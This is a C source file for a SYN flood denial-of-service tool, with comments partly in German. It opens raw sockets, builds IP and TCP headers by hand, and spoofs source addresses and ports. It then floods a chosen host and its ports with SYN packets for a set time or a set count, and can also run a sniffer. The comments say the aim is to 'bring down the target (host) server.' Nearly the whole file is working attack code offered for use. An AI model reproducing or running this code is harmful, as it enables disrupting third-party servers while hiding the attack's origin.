
#include "synflood.h"
#include <time.h>

int allports[MAXPORT] ; 
int maxports ; 		/* we start to count at zero, there one has to add 1 for module calculation */ 
char portlist[MAXPORT*6] ; 

bool attack = true;
struct in_addr current_ipv4_addr;

/* the following extern declared variables are defined in src/cli.c */ 
extern bool enable_sniffer;  
extern bool enable_spoofing;  
extern bool enable_attack_time;  
extern bool enable_wait_time;  
extern bool enable_loop_count;  
extern bool enable_classc ; 	

int loops_done = 0 ; 


void
sigalrm_handler (int signo)
{
  attack = false;
}


void
sigterm_handler (int signo)
{
  exit(EXIT_SUCCESS);
}


/**
 * First create a raw socket and tell the kernel that we'll be including
 * the IP and TCP headers ourselves and that no non-link layer headers
 * should be prepended by the kernel.
*/
int
getRawSocket ()
{
  int on = 1;
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sockfd == -1) {
    if (errno == EPERM)
      die("%d: must be root to open raw sockets.\n", __LINE__ - 3);
    die("%d: %s\n", __LINE__ - 4, errno, strerror(errno));
  }
  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1)
    die("%s: %d\n", __LINE__ - 1, strerror(errno));
  return sockfd;
}


void
setIpHeaders (struct iphdr *ip_headers, struct in_addr *hin_addr)
{
  ip_headers->ihl = 0x5;
  ip_headers->version = 0x4;
  ip_headers->tos = 0x00;
  ip_headers->tot_len = 0x00;     /* Will be set by the kernel. See raw(7). */
  ip_headers->id = 0x0100;          /* Will be set by the kernel. See raw(7). == x0001 */
  ip_headers->frag_off = 0x0000;  /* Don't fragment. */
  ip_headers->ttl = 0x40;         /* 0d64 */
  ip_headers->protocol = 0x06;
  ip_headers->check = 0x0000;     /* Will be set by the kernel. See raw(7). */
  /* Can't wait for the kernel because need to compute the checksum ourselves. */
  /* ip_headers->saddr = enable_spoofing ? getSpoofedIpAddr() : current_ipv4_addr.s_addr; */ 
  ip_headers->saddr = current_ipv4_addr.s_addr ; 
  if ( enable_spoofing ) 
    ip_headers->saddr = net_getSpoofedIpAddr() ; 
  if ( enable_classc ) 
    ip_headers->saddr = host_getSpoofedIpAddr() ; 
  ip_headers->daddr = hin_addr->s_addr;
}


void
setTcpHeaders (struct tcphdr *tcp_headers, in_port_t port)
{
  tcp_headers->th_sport = htons(getSpoofedPortNumber());
  tcp_headers->th_dport = port;
  tcp_headers->th_seq = htonl(random());
  tcp_headers->th_ack = 0x0000;
  tcp_headers->th_x2 = 0x00;
  tcp_headers->th_off = 0x5;
  tcp_headers->th_flags = TH_SYN;
  tcp_headers->th_win = htons(8192);
  tcp_headers->th_sum = 0x00;   /* We will need to construct a pseudo header and compute this later. */
  tcp_headers->th_urp = 0x00;
}

void printhex ( uint16_t *buffer , int size ) {
  int i=0 ; 
  printf ( "size:%d \n" , size ) ; 
  for ( i=0 ; i < size ; i++ ) 
    printf ( "%04x %c ", buffer[i] ,  buffer[i] ) ; 
  printf ( "\n" ) ; 
}


/**
 * TCP uses a special checksum algorithm whereby the checksum is not only calculated
 * over the bytes of the TCP data but it also includes some network layer (IP) data.
 * A 12-bytes "pseudo-checksum" is created and temporarily prepended to the TCP segment
 * for the sake of checksum calculation.
 * See pages 774-777 of "The TCP-IP Guide by Charles M. Kozierok (2005)" for more
 * information. Also see https://tools.ietf.org/html/rfc1071 for the algorithm.
 * Note: in our given scenario, there will never be an "odd byte".
*/
uint16_t
pseudoHeaderTcpChecksum (struct iphdr *ip_headers, struct tcphdr *tcp_headers, int sop , uint8_t payload[PAYLOAD]  )
{
  uint16_t chksum_buffer[sizeof(tcp_pseudo_header_t) + PAYLOAD ]; 
  /* uint16_t chksum_buffer[sizeof(tcp_pseudo_header_t) ]; */ 

  /* First populate the pseudo header. */
  tcp_pseudo_header_t *pheader = (tcp_pseudo_header_t *) chksum_buffer;
  pheader->saddr = ip_headers->saddr;
  pheader->daddr = ip_headers->daddr;
  pheader->proto = ip_headers->protocol;
  pheader->rsvd = 0x0;
  pheader->seglen = htons(20);
  memcpy(&pheader->thdr, tcp_headers, sizeof(struct tcphdr) + PAYLOAD ); 
  /* memcpy(&pheader->thdr, tcp_headers, sizeof(struct tcphdr) ); */ 

  /* Now compute the checksum following the steps listed in the RFC. */
  long chksum = 0;
#ifdef WITHPAYLOAD
  strncpy ( (char*)(chksum_buffer+PACKET_BUFFER_LEN), (char*)payload , sop ) ;  
#endif
  uint16_t *ptr = chksum_buffer;
  size_t count = sizeof(tcp_pseudo_header_t) + sop ;
  printf ( "count %d , sop %d \n" , (int)count , sop ) ; 
  while (count > 1) {
    chksum += *ptr;
    ++ptr;
    count -= 2;
  }
  if (count == 1)
    chksum += *(uint8_t *)ptr;

  chksum = (chksum >> 16) + (chksum & 0xffff);
  chksum = chksum + (chksum >> 16);
  chksum = ~chksum;
  return (uint16_t) chksum;
}


#ifdef WITHPAYLOAD 
int addpayload ( uint8_t *packet , char mode ){
  int i ; 
  char payload[] = "hello synflood " ; 
  for ( i=0 ; i < sizeof(payload) - 1 ; i++ ) {
    packet[PACKET_BUFFER_LEN+i] = (uint8_t)payload[i] ; 
  } 
  packet[PACKET_BUFFER_LEN+i] = (uint8_t)mode ; 
  return ++i ; 
}
#endif 


/**
 * Bring down the target (host) server with a flood of TCP SYN packets
 * with spoofed IP addresses.
*/
void
synflood_t (char *hostname, struct sockaddr_in host_addr)
{
  int sockfd = getRawSocket();

  uint8_t packet[PACKET_BUFFER_LEN+PAYLOAD];
  uint8_t payload[PAYLOAD]; 
  struct iphdr *ip_headers = (struct iphdr *) packet;
  struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);

  int sop = 0 ;  	/* size of payload */ 
  int currentport = 0 ; 

  vlog ( "synflood_t started \n" ) ; 

  while (attack) {
    /* Because we want to spoof the IP address and port number of each packet, we will need to
     * reconstruct the packet each time we want to send one. */
    host_addr.sin_port = ntohs(allports[currentport]) ; 
    setIpHeaders(ip_headers, &host_addr.sin_addr);
    setTcpHeaders(tcp_headers, host_addr.sin_port);
    currentport++ ; 
    currentport = currentport % ( maxports + 1 ) ; 
#ifdef WITHPAYLOAD
    sop = addpayload(packet, 't') ; 
#endif
    strncpy ( (char*)payload , (char*)(packet+PACKET_BUFFER_LEN) , sop ) ; 
    tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers, sop , payload );
    if (sendto(sockfd, packet, PACKET_BUFFER_LEN+sop, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
      die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
    memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
    loops_done++ ; 
  }
}

/**
 * Bring down the target (host) server with a flood of TCP SYN packets
 * with spoofed IP addresses.
*/
void
synflood_c (char *hostname, struct sockaddr_in host_addr, unsigned int loop )
{
  int sockfd = getRawSocket();

  uint8_t packet[PACKET_BUFFER_LEN+PAYLOAD];
  uint8_t payload[PAYLOAD]; 
  struct iphdr *ip_headers = (struct iphdr *) packet;
  struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
  int i ; 	/* laufvariable */ 
  int sop = 0 ;  	/* size of payload */ 

  int currentport = 0 ; 

  vlog ( "synflood_c started : \n" ) ; 

  /* wo der port fuer host_addr gesetzt wird ist unklar */ 
  for ( i=0; i<loop; i++ )  {
    /* Because we want to spoof the IP address and port number of each packet, we will need to
     * reconstruct the packet each time we want to send one. */
    /* printf ( "synflood_c 1  %d \n" , htons ( host_addr.sin_port ) ) ; */ 
    host_addr.sin_port = ntohs(allports[currentport]) ; 
    setIpHeaders(ip_headers, &host_addr.sin_addr);
    setTcpHeaders(tcp_headers, host_addr.sin_port ) ; 
    /* printf ( "synflood_c 2  %ld %ld %ld \n" , PACKET_BUFFER_LEN , sizeof ( packet ) , sizeof(uint8_t) ) ; */ 
    currentport++ ; 
    currentport = currentport % ( maxports + 1 ) ; 
#ifdef WITHPAYLOAD
    sop = addpayload(packet, 'c') ;  
    /* wenn sop = 0 ; dann passt checksum und frame ist ohne payload */ 
#endif
    strncpy ( (char*)payload , (char*)(packet+PACKET_BUFFER_LEN) , sop ) ; 
    /* printf ( "payload: %s \n" , payload ) ; */ 
    tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers, sop , payload );
    if (sendto(sockfd, packet, PACKET_BUFFER_LEN+sop, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
      die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
    memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
    loops_done++ ; 
  }

  /* sleep ( 5 ) ; */ 
}


int
main (int argc, char *argv[], char *envp[])
{
  vlog("synflood process started [pid: %d].\n", getpid());

  /* Register the signal handlers. */
  signal(SIGALRM, sigalrm_handler);
  signal(SIGTERM, sigterm_handler);

  seedRandomNumberGenerator();

  /* Set the process group so that we may later kill all processes
   * that this process will fork (this process included) on encountering
   * a critical error. */
  if (setpgid(0, 0) == -1)
    die("%d: %s\n", __LINE__ - 1, strerror(errno));

  /* Parse the command line arguments. */
  pid_t pid;
  unsigned short int port;
  unsigned int attack_time;
  unsigned int wait_time;
  unsigned int loop_count ;
  struct sockaddr_in host_addr;
  char hostname[HOSTNAME_BUFFER_LENGTH];
  getOptions(argc, argv, hostname, &port, &host_addr, &attack_time, &wait_time, &loop_count );
  current_ipv4_addr = getCurrentIpAddr();
  char current_ipv4_addr_buf[32];
  strcpy(current_ipv4_addr_buf, inet_ntoa(current_ipv4_addr));

  vlog("Initialized synflood with:\n\
  target hostname:           %s\n\
  target address:            %s\n\
  target port(s):            %s\n\
  enabled attack time:       %s\n\
  attack time:               %u %s\n\
  sniffer:                   %s\n\
  class-c network spoofing:  %s\n\
  enable spoofing:           %s\n\
  enabled wait time:         %s\n\
  wait time:                 %u\n\
  enabled loop count:        %s\n\
  loop count:                %u\n\
  own address:               %s\n",
       hostname, inet_ntoa(host_addr.sin_addr), portlist, 
       enable_attack_time ? "enabled" : "disabled" , attack_time,
       attack_time == 1 ? "second" : "seconds", 
       enable_sniffer ? "enabled" : "disabled",
       enable_classc ? "enabled" : "disabled", 
       enable_spoofing ? "enabled" : "disabled", 
       enable_wait_time ? "enabled" : "disabled" , wait_time , 
       enable_loop_count ? "enabled" : "disabled" , loop_count , 
       current_ipv4_addr_buf);

  if (enable_sniffer) {
    pid = fork();
    if (pid == 0)
      sniff(hostname, port);
  }

  if ( ! ( enable_attack_time ^ enable_loop_count ) ) { 
      vlog ( "nothing done, either --attack-time or --loop-count must be enabled \n" ) ; 
      return EXIT_FAILURE ; 
  } 

  if ( enable_loop_count & ( ( maxports + 1 ) > loop_count ) ) { 
      vlog ( "number of ports (%d) is greater than loop-count (%d) - this doesn't make sense \n" , maxports + 1 , loop_count ) ; 
  }

  vlog("Commencing attack in %d %s.\n", wait_time+1, wait_time == 1 ? "second" : "seconds");
  sleep(wait_time+1);

  struct timeval time;
  int64_t s1 , s2 , s3 , s4 , s5 , s6 ; 
  gettimeofday(&time, NULL);
  s5 = (int64_t)(time.tv_sec) ;
  s1 = s5 % 60 ;
  s2 = (time.tv_usec );

  vlog ( "time of first attack - showing second only  %3d.%06d \n" , (int)s1 , (int)s2 ) ; 

  /* vlog("waiting time : %d %s \n", wait_time, wait_time == 1 ? "second" : "seconds");
  vlog("loop count : %d \n" , loop_count ) ; */ 

  if ( enable_attack_time ) {
      alarm(attack_time);
      synflood_t (hostname, host_addr);
  } ; 

  if ( enable_loop_count ) {
      synflood_c (hostname, host_addr, loop_count );
  } ; 

  gettimeofday(&time, NULL);
  s6 = (int64_t)(time.tv_sec) ;
  s3 = s6 % 60 ;
  s4 = (time.tv_usec );

  vlog ( "time of last attack - showing second only  %3d.%06d \n" , (int)s3 , (int)s4 ) ; 
  if ( ( s4 - s2 ) > 0 ) 
       vlog ( "duration (seconds) :   %3d.%06d \n" , (int)(s6 - s5) , (int)(s4 - s2) ) ; 
     else 
       vlog ( "duration (seconds) :   %3d.%06d \n" , (int)(s6 - s5 + 1) , (int)(s2 - s4) ) ; 

  sleep(wait_time);
  vlog("number of packets sent out: more than %d \n" , loops_done ) ; 
  vlog("job finished \n" ) ; 
  
  /* It seems like pcap spawns some kind of weird daemon or regular child process that we can't
   * wait on and kill normally. So take down the entire process group! */
  if (killpg(0, SIGTERM) == -1)
    fprintf(stderr, "%d: %s.\n", __LINE__ - 1, strerror(errno));
  
  return EXIT_SUCCESS;
}

